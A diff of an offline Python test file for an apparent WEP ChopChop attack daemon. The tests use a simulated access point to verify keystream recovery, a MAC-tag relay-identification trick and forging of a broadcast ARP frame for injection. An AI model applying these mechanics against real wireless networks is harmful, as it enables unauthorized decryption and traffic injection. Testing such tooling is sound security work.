@@ -1,11 +1,12 @@
 """Offline tests for the WEP ChopChop daemon.
 
 The live oracle (does the AP relay?) is hardware-verified by the probe; here we
-prove the OFFLINE-testable core — the byte-walk keystream recovery + the RX
-oracle matcher + the forge/handoff — by driving the daemon with a SIMULATED
-oracle (decrypt the shortened frame with a known key, accept iff the ICV is
-valid). If recovery reproduces the true keystream against that oracle, the
-attack logic is correct; only the on-air relay-recognition needs the box.
+prove the OFFLINE-testable core — the byte-walk keystream recovery, the
+tag-and-read-back identity mechanism, and the forge/handoff — by driving the
+daemon with a SIMULATED AP (decrypt the shortened frame with a known key, relay
+iff the ICV is valid, echoing back the MAC tag we stamped). If recovery
+reproduces the true keystream against that, the attack logic is correct; only
+the on-air relay path needs the box.
 """
 from __future__ import annotations
 
@@ -13,15 +14,21 @@ import asyncio
 import zlib
 from types import SimpleNamespace
 
-from wifit3.engine.attacks.wep.chopchop import WepChopChop, _hdr_len
+from wifit3.engine.attacks.wep.chopchop import (
+    WepChopChop,
+    _SENTINEL,
+    _hdr_len,
+)
 from wifit3.engine.attacks.wep.wep_crypto import (
     CRC32_RESIDUE,
     arp_request_plaintext,
+    chop_last_byte_and_fixup,
     icv,
 )
 
 OUR = bytes.fromhex("02aabbccddee")
 BSSID = "11:22:33:44:55:66"
+BSSID_B = bytes.fromhex("112233445566")
 KEY = b"abcde"
 IV = bytes([0x11, 0x22, 0x33])
 
@@ -53,12 +60,17 @@ def _arp_cipher(sender_ip, target_ip):
 
 
 def _sim_oracle(iv: bytes, key: bytes):
-    """Stand in for the AP: decrypt the shortened cipher; 'relay' iff the ICV
-    residue is valid (exactly what the AP's ICV check does)."""
-    async def oracle(short: bytes) -> bool:
-        kstream = _rc4(iv + key, len(short))
-        plain = bytes(c ^ k for c, k in zip(short, kstream))
-        return (zlib.crc32(plain) & 0xFFFFFFFF) == CRC32_RESIDUE
+    """Stand in for the AP at the abstract oracle level: return the (unique)
+    guess whose chopped+fixed frame has a valid ICV — exactly the byte the AP
+    would relay. None if none do."""
+    async def oracle(body: bytes):
+        for g in range(256):
+            short = chop_last_byte_and_fixup(body, g)
+            kstream = _rc4(iv + key, len(short))
+            plain = bytes(c ^ k for c, k in zip(short, kstream))
+            if (zlib.crc32(plain) & 0xFFFFFFFF) == CRC32_RESIDUE:
+                return g
+        return None
     return oracle
 
 
@@ -77,12 +89,13 @@ def _daemon(oracle=None):
     return d, calls
 
 
-# ---- byte-walk: backtracking DFS over relayed candidates -------------------
+# ---- byte-walk: linear recovery, identity read from each relay -------------
 
 def _assert_valid_forged_arp(forged: bytes):
     """The forged frame decrypts (key abcde) to a well-formed broadcast ARP
     from us with a valid ICV — i.e. one the AP will relay."""
     body = forged[_hdr_len(forged[0], forged[1]):]
+    assert forged[16:22] == b"\xff" * 6          # broadcast DA (a real ARP req)
     assert body[:3] == IV                        # reused the target's IV
     plain = bytes(c ^ k for c, k in zip(body[4:], _rc4(IV + KEY, len(body) - 4)))
     snap_arp = bytes([0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06])
@@ -102,78 +115,72 @@ async def test_chop_and_forge_recovers_and_forges_valid_arp():
 async def test_chop_and_forge_none_when_ap_silent():
     cipher, _ = _arp_cipher(bytes([10, 0, 0, 5]), bytes([10, 0, 0, 1]))
 
-    async def never(_short):
-        return False
+    async def never(_body):
+        return None
     d, _ = _daemon(oracle=never)
+    # No byte relays at full length → gap is the whole tail (>1 byte) → give up.
     assert await d._chop_and_forge(cipher) is None
 
 
-async def test_dfs_backtracks_past_a_decoy_response():
-    """The crux: if the AP relays MORE than one byte at a step, we don't have
-    to know which is real — we try each; a wrong (decoy) byte's sub-walk
-    dead-ends and we backtrack to the true one. Here guess 0x00 is a decoy that
-    relays (swept before the true 0xd8); the DFS must back out of it."""
-    from wifit3.engine.attacks.wep.wep_crypto import chop_last_byte_and_fixup
+async def test_chop_and_forge_aborts_on_relayed_sentinel():
+    """If the AP relays the bad-ICV sentinel, it doesn't discard invalid frames
+    — chopchop can't work; we bail (and log), not loop forever."""
     cipher, _ = _arp_cipher(bytes([10, 0, 0, 5]), bytes([10, 0, 0, 1]))
-    base = _sim_oracle(IV, KEY)
-    decoy_short = chop_last_byte_and_fixup(cipher, 0x00)   # wrong, but "relays"
-
-    async def with_decoy(short: bytes) -> bool:
-        if short == decoy_short:
-            return True                          # decoy: a bogus extra response
-        return await base(short)
-
-    d, _ = _daemon(oracle=with_decoy)
-    forged = await d._chop_and_forge(cipher)
-    assert forged is not None                    # backtracked past the decoy
-    _assert_valid_forged_arp(forged)
-
-
-async def test_skips_seed_that_is_not_an_arp_request():
-    """A broadcast frame that's ARP-SIZED but not an ARP request decrypts (in
-    the recovered tail) to a non-zero target-MAC — the assumed prefix is wrong,
-    so the forge can't work. We detect it from the chopped keystream and skip,
-    rather than wasting the brute / failing silently (the "23/24 then nada")."""
-    data = bytearray(36)
-    data[26:32] = b"\xde\xad\xbe\xef\x11\x22"     # non-zero target MAC ⇒ not a req
-    plain = bytes(data) + icv(bytes(data))
-    ks = _rc4(IV + KEY, len(plain))
-    cipher = bytes(p ^ k for p, k in zip(plain, ks))
     logs = []
-    iface = SimpleNamespace(register_rx_callback=lambda c: None,
-                            unregister_rx_callback=lambda c: None)
+
+    async def sentinel(_body):
+        return _SENTINEL
+    d, _ = _daemon(oracle=sentinel)
+    d._log = logs.append
+    assert await d._chop_and_forge(cipher) is None
+    assert any("bad-ICV" in m for m in logs)
+
+
+# ---- tag-and-read-back via a SIMULATED relaying AP (the live mechanism) -----
+
+def _relaying_iface(key: bytes, daemon_box):
+    """A fake iface whose send_raw plays the AP: decrypt the sent frame's WEP
+    body; if the ICV is valid, 'relay' it back as a FromDS frame echoing the DA
+    tag we stamped — exactly how the daemon learns which guess was accepted."""
+    box = {}
+
+    async def send_raw(frame, use_no_ack=False, sw_seq=None):
+        d = box["d"]
+        da = frame[16:22]                       # Addr3 (DA) of our ToDS frame
+        body = frame[24:]
+        ct = body[4:]                           # skip IV(3)+KeyID(1)
+        plain = bytes(c ^ k for c, k in zip(ct, _rc4(IV + key, len(ct))))
+        if (zlib.crc32(plain) & 0xFFFFFFFF) != CRC32_RESIDUE:
+            return                              # bad ICV → AP drops it
+        # Relay: FromDS, Addr1=DA(tag), Addr2=BSSID, Addr3=SA(our STA).
+        relay = (bytes([0x08, 0x42, 0, 0]) + da + BSSID_B + OUR
+                 + b"\x00\x00" + body)
+        d._rx_cb(relay, -40, 0.0)
+
+    box["d"] = daemon_box
+    return SimpleNamespace(register_rx_callback=lambda c: None,
+                           unregister_rx_callback=lambda c: None,
+                           send_raw=send_raw), box
+
+
+async def test_tag_and_read_back_recovers_keystream_end_to_end():
+    """The whole new mechanism, offline: the daemon stamps each guess into the
+    DA, the simulated AP relays only the valid-ICV one (echoing that DA), and
+    the daemon reads the guess back out of the relay's Addr1 — no inference,
+    no DFS — recovering the keystream and forging a valid ARP."""
+    cipher, _ = _arp_cipher(bytes([10, 0, 0, 5]), bytes([10, 0, 0, 1]))
+    holder = {}
+    iface, box = _relaying_iface(KEY, None)
     d = WepChopChop(iface, SimpleNamespace(bssid=BSSID), SimpleNamespace(),
-                    source_mac=OUR, on_forged_arp=lambda f: None,
-                    log_callback=logs.append, oracle=_sim_oracle(IV, KEY))
+                    source_mac=OUR, on_forged_arp=lambda f: holder.setdefault("f", f))
+    box["d"] = d
     d._active = True
-    d._cur_iv, d._cur_keyid, d._cur_cipher = IV, 0, cipher
+    d._cur_iv, d._cur_keyid = IV, 0
+    d._SEND_INTERVAL_S = 0          # don't pace the test
+    d._DRAIN_S = 0
     forged = await d._chop_and_forge(cipher)
-    assert forged is None
-    assert any("NOT an ARP request" in m for m in logs)
-
-
-async def test_find_all_accepted_rejects_unconfirmed_spurious_relay():
-    """A wrong guess that relays only ONCE (echo / timing slip) is rejected by
-    the re-confirm step, so it doesn't even enter the DFS branch set."""
-    from wifit3.engine.attacks.wep.wep_crypto import chop_last_byte_and_fixup
-    cipher, ks_true = _arp_cipher(bytes([10, 0, 0, 5]), bytes([10, 0, 0, 1]))
-    true_last = cipher[-1] ^ ks_true[-1]              # 0xd8
-    s_true = chop_last_byte_and_fixup(cipher, true_last)
-    s_spurious = chop_last_byte_and_fixup(cipher, 0)  # wrong, swept first
-    fired = {"n": 0}
-
-    async def flaky(short: bytes) -> bool:
-        if short == s_true:
-            return True
-        if short == s_spurious and fired["n"] == 0:
-            fired["n"] += 1
-            return True                              # one-shot (won't re-confirm)
-        return False
-
-    d, _ = _daemon(oracle=flaky)
-    responders = await d._find_all_accepted(cipher)
-    assert fired["n"] == 1                            # spurious offered…
-    assert responders == [true_last]                  # …but only the true byte
+    assert forged is not None
+    _assert_valid_forged_arp(forged)
 
 
 async def test_succeed_hands_forged_arp_to_campaign_and_stops():
@@ -195,9 +202,9 @@ async def test_stop_halts_an_in_flight_byte_walk():
                 + bytes.fromhex("aa:bb:cc:dd:ee:06") + OUR + b"\x00\x00"
                 + IV + b"\x00" + bytes(40))               # 68B broadcast WEP
 
-    async def slow(_short):           # never relays → keeps the walk sweeping
-        await asyncio.sleep(0.003)
-        return False
+    async def slow(_body):            # never relays → keeps the walk going
+        await asyncio.sleep(0.01)
+        return None
 
     iface = SimpleNamespace(register_rx_callback=lambda c: None,
                             unregister_rx_callback=lambda c: None)
@@ -214,38 +221,51 @@ async def test_stop_halts_an_in_flight_byte_walk():
     assert task.done()               # the loop actually ended (no orphan)
 
 
-# ---- the live-AP oracle matcher (RX callback) ------------------------------
+# ---- the live-AP RX matcher: read the guess out of the relay's MAC tag ------
 
-def _relay_frame(sa=OUR, fc1=0x42, da=b"\xff" * 6, fc0=0x08, pad=40):
-    return (bytes([fc0, fc1]) + b"\x00\x00" + da + bytes.fromhex("aa:bb:cc:dd:ee:06")
-            + sa + b"\x00\x00" + b"\xab\xcd\xef\x00" + b"\x00" * pad)
+def _relay_frame(tag: bytes, guess: int, sa=OUR, fc1=0x42, fc0=0x08):
+    """A FromDS data frame whose Addr1 (RA) is the multicast tag we stamped."""
+    b1 = (tag[0] & 0xFE) | (0 if guess == _SENTINEL else 1)
+    addr1 = bytes([0xFF, b1, tag[1], tag[2], tag[3], guess & 0xFF])
+    return (bytes([fc0, fc1]) + b"\x00\x00" + addr1 + BSSID_B + sa
+            + b"\x00\x00" + b"\xab\xcd\xef\x00" + b"\x00" * 40)
 
 
-def test_rx_oracle_fires_on_pinned_relay():
+def test_rx_reads_guess_from_tagged_relay():
     d, _ = _daemon()
-    relay = _relay_frame()
-    d._expected_relay_len = len(relay)
-    d._rx_cb(relay, -40, 0.0)
-    assert d._relay_seen
+    d._cur_tag = bytes([0x12, 0x34, 0x56, 0x78])
+    d._rx_cb(_relay_frame(d._cur_tag, 0x6B), -40, 0.0)
+    assert d._relayed_guess == 0x6B
+    assert not d._sentinel_relayed
 
 
-def test_rx_oracle_ignores_non_matching():
+def test_rx_ignores_relay_with_a_different_tag():
+    """A stale relay from the PREVIOUS byte carries that position's (different)
+    random tag → must be ignored (this is what killed the old echo bug)."""
     d, _ = _daemon()
-    d._expected_relay_len = len(_relay_frame())
-    d._rx_cb(_relay_frame(sa=bytes.fromhex("020000000099")), -40, 0.0)  # not us
-    assert not d._relay_seen
-    d._rx_cb(_relay_frame(fc1=0x41), -40, 0.0)        # ToDS (our own inject)
-    assert not d._relay_seen
-    d._rx_cb(_relay_frame(da=OUR), -40, 0.0)          # unicast DA
-    assert not d._relay_seen
-    d._rx_cb(_relay_frame(fc0=0x80), -40, 0.0)        # mgmt, not data
-    assert not d._relay_seen
+    d._cur_tag = bytes([0x12, 0x34, 0x56, 0x78])
+    other = bytes([0x12, 0x99, 0x56, 0x78])           # byte-1 differs
+    d._rx_cb(_relay_frame(other, 0x6B), -40, 0.0)
+    assert d._relayed_guess is None
 
 
-def test_rx_oracle_rejects_stale_echo_of_wrong_length():
-    """The sibling-BSS echo of the PREVIOUS byte is 1 longer than this guess's
-    expected relay — it must NOT be accepted (that bug stalled the walk)."""
+def test_rx_ignores_non_matching():
     d, _ = _daemon()
-    d._expected_relay_len = len(_relay_frame())        # this byte's expectation
-    d._rx_cb(_relay_frame(pad=41), -40, 0.0)           # previous byte's relay (+1B)
-    assert not d._relay_seen
+    d._cur_tag = bytes([0x12, 0x34, 0x56, 0x78])
+    d._rx_cb(_relay_frame(d._cur_tag, 0x6B, sa=bytes.fromhex("020000000099")),
+             -40, 0.0)                                 # SA not us
+    assert d._relayed_guess is None
+    d._rx_cb(_relay_frame(d._cur_tag, 0x6B, fc1=0x41), -40, 0.0)   # ToDS
+    assert d._relayed_guess is None
+    d._rx_cb(_relay_frame(d._cur_tag, 0x6B, fc0=0x80), -40, 0.0)   # mgmt
+    assert d._relayed_guess is None
+
+
+def test_rx_relayed_sentinel_flags_non_vulnerable_ap():
+    """A relayed sentinel (byte-1 LSB clear) means the AP forwarded a bad-ICV
+    frame → set the flag, do NOT treat its address byte as a recovered guess."""
+    d, _ = _daemon()
+    d._cur_tag = bytes([0x12, 0x34, 0x56, 0x78])
+    d._rx_cb(_relay_frame(d._cur_tag, _SENTINEL), -40, 0.0)
+    assert d._sentinel_relayed
+    assert d._relayed_guess is None
